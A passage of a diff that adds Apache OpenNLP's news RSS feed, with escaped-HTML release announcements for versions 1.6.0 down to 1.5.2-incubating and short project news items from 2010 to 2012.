+It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging,
+named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.6.0 binary and source distributions are available for download from our download page:
+&lt;a href=&quot;http://opennlp.apache.org/cgi-bin/download.cgi&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/cgi-bin/download.cgi&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the Maven Dependency page for more details:
+&lt;a href=&quot;http://opennlp.apache.org/maven-dependency.html&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/maven-dependency.html&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;This release introduces many new features, improvements and bug fixes. The API
+has been improved for a better consistency and 1.4 deprecated methods were
+removed. Now Java 1.7 is required.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Additionally the release contains the following noteworthy changes:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Added evalutation support to the parser and doccat components&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added support to Evalita 07/09, Brat and OntoNotes corpus formats&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Now L-BFGS is stable&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added Snowball to the Stemmer package&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;NameFinder now supports a user defined factory&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added pluggable machine learning support&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added a lemmatizer module&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added Cluster, Document Begin and Clark feature generators to the Name Finder&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added Liblinear as a Machine Learning addon&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Entity Linker now has a command line interface&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added sequence classification support&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;A detailed list of the issues related to this release can be found in the release notes.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;For a complete list of fixed bugs and improvements please see the RELEASE_NOTES
+file included in the distribution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.5.3 released</title>
+      <link>https://opennlp.apache.org/news/release-153.html</link>
+      <pubDate>Wed, 17 Apr 2013 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-153.html</guid>
+      	<description>
+	&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.5.3 of Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural language text.
+It supports the most common NLP tasks, such as tokenization, sentence segmentation, part-of-speech tagging,
+named entity extraction, chunking, parsing, and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.5.3 binary and source distributions are available for download from our download page:
+&lt;a href=&quot;http://opennlp.apache.org/cgi-bin/download.cgi&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/cgi-bin/download.cgi&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well. See the Maven Dependency page for more details:
+&lt;a href=&quot;http://opennlp.apache.org/maven-dependency.html&quot; class=&quot;bare&quot;&gt;http://opennlp.apache.org/maven-dependency.html&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;This release contains a couple of new features, improvements and bug fixes. The CLI
+has been improved for a better consistency. Now the tools supports extensions that
+can be configured from the model, including customized context generators and
+validators.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Additionally the release contains the following noteworthy changes:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Porter Stemmer tool&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;L-BFGS parameter estimation&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Improved documentation&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Fine-grained POSTagger evaluation report&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Improved support to load user provided feature generator and context validation classes from OSGi environment&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;A detailed list of the issues related to this release can be found in the release notes.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;For a complete list of fixed bugs and improvements please see the RELEASE_NOTES file included in the distribution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>OpenNLP graduated from the incubator as a Top Level Project</title>
+      <link>https://opennlp.apache.org/news/news-2012-02-15.html</link>
+      <pubDate>Wed, 15 Feb 2012 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/news-2012-02-15.html</guid>
+      	<description>
+	&lt;div class=&quot;sect1&quot;&gt;
+&lt;h2 id=&quot;interview_on_cynical_developer_podcast&quot;&gt;Interview on Cynical Developer podcast&lt;/h2&gt;
+&lt;div class=&quot;sectionbody&quot;&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;OpenNLP graduated from the incubator as a Top Level Project&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>New members and new features&amp;#8230;&amp;#8203;</title>
+      <link>https://opennlp.apache.org/news/news-2011-12-22.html</link>
+      <pubDate>Thu, 22 Dec 2011 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/news-2011-12-22.html</guid>
+      	<description>
+	&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Join everyone in welcoming our newest members to the group, Aliaksandr Autayeu and Boris Galitsky.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;OpenNLP is moving forward with new features, fixes and advancements for the New Year.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Merry Chistmas &amp;amp; Happy New Year! Again&amp;#8230;&amp;#8203; yes, it has been another year.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>First release of 1.5.1-incubating is ready!</title>
+      <link>https://opennlp.apache.org/news/news-2011-05-02.html</link>
+      <pubDate>Mon, 28 Nov 2011 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/news-2011-05-02.html</guid>
+      	<description>
+	&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;First release of opennlp-1.5.1-incubating ready for primetime.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Voting started on opennlp-dev list voting +1 (5-binding and 2-non-binding).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Voting carried over to general list voting +1 (1-binding and 1-non-binding).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Recorded no 0 votes or -1 votes.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Apache OpenNLP 1.5.2 Incubating released</title>
+      <link>https://opennlp.apache.org/news/release-152.html</link>
+      <pubDate>Mon, 28 Nov 2011 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/release-152.html</guid>
+      	<description>
+	&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP team is pleased to announce the release of version 1.5.2-incubating of
+Apache OpenNLP.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The Apache OpenNLP library is a machine learning based toolkit for the processing of natural
+language text. It supports the most common NLP tasks, such as tokenization, sentence
+segmentation, part-of-speech tagging, named entity extraction, chunking, parsing,
+and coreference resolution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP 1.5.2-incubating binary and source distributions are available for download
+from our download page:
+&lt;a href=&quot;http://incubator.apache.org/opennlp/download.cgi&quot; class=&quot;bare&quot;&gt;http://incubator.apache.org/opennlp/download.cgi&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;The OpenNLP library is distributed by Maven Central as well.
+See the Maven Dependency page for more details:
+&lt;a href=&quot;http://incubator.apache.org/opennlp/maven-dependency.html&quot; class=&quot;bare&quot;&gt;http://incubator.apache.org/opennlp/maven-dependency.html&lt;/a&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;This release contains a couple of new features, improvements and bug fixes.
+The maxent trainer can now run in multiple threads to utilize
+multi-core CPUs, configurable feature generation was added to the name finder,
+the perceptron trainer was refactored and improved, machine learners
+can now be configured with much more options via a parameter file,
+evaluators can print out detailed evaluation information.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Additionally the release contains the following noteworthy changes:&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Improved the white space handling in the Sentence Detector and its training code&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added more cross validator command line tools&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Command line handling code has been refactored&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Fixed problems with the new build&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Now uses fast token class feature generation code by default&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Added support for BioNLP/NLPBA 2004 shared task data&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Removal of old and deprecated code&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Dictionary case sensitivity support is now done properly&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Support for OSGi&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;For a complete list of fixed bugs and improvements please see the RELEASE_NOTES
+file included in the distribution.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;--The Apache OpenNLP Team&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Issue tracker moved to JIRA</title>
+      <link>https://opennlp.apache.org/news/news-2011-01-29.html</link>
+      <pubDate>Sat, 29 Jan 2011 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/news-2011-01-29.html</guid>
+      	<description>
+	&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;We have moved JIRA issues to a new list. Special THANKS go to Gavin for helping.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;We are preparing for our first full release of the package.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>Working on Apache Incubator requirements</title>
+      <link>https://opennlp.apache.org/news/news-2010-12-24.html</link>
+      <pubDate>Fri, 24 Dec 2010 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/news-2010-12-24.html</guid>
+      	<description>
+	&lt;div class=&quot;ulist&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Merry Christmas &amp;amp; Happy New Year!&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;We have the sources online, are working on porting the documentation, and cleanup of the code to meet Apache
+Incubator requirements.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>OpenNLP is now into Apache Incubation!</title>
+      <link>https://opennlp.apache.org/news/news-2010-11-23.html</link>
+      <pubDate>Tue, 23 Nov 2010 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/news-2010-11-23.html</guid>
+      	<description>
+	&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;Apache Incubator voted +1 (8-binding and 9-non-binding votes) to accept OpenNLP into incubation.&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+    <item>
+      <title>OpenNLP is candidated to Apache Incubation!</title>
+      <link>https://opennlp.apache.org/news/news-2010-11-18.html</link>
+      <pubDate>Thu, 18 Nov 2010 00:00:00 +0000</pubDate>
+      <guid isPermaLink="false">news/news-2010-11-18.html</guid>
+      	<description>
+	&lt;div class=&quot;paragraph&quot;&gt;
+&lt;p&gt;OpenNLP Proposal presented to general list for incubator.&lt;/p&gt;
+&lt;/div&gt;
+	</description>
+    </item>
+
+  </channel> 
+</rss>
